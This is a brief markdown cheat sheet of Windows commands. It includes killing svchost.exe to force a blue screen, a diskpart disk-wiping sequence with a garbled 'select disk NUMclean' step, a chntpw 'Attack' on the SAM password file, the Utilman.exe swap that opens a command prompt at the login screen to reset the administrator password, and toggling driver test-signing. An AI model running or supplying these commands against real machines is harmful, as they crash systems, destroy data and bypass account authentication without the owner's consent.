# Windows

### Blue Screen
```
taskkill /t /f /IM "svchost.exe"
```

### Diskpart
`diskpart` > `list disk` > `select disk NUMclean` > `create partition primary` > `format fs=ntfs quick` > `assign` > `exit`

### Password

**Location :**
`Windows` > `System32` > `config`


**Attack :**
```sh
chntpw -i SAM
```

### Windows Server Password
```
cd Windows\System32
move Utilman.exe Utilman.exe.old
copy cmd.exe Utilman.exe
```
```
Win+U
net user administrator passwd
```

```
cd Windows\System32
move Utilman.exe.old Utilman.exe
```

### Windows 10 Test Mode

**Enable**
```
Bcdedit.exe -set TESTSIGNING ON
```

**Disable**
```
Bcdedit.exe -set TESTSIGNING OFF
```

> -- Berthose Fin --
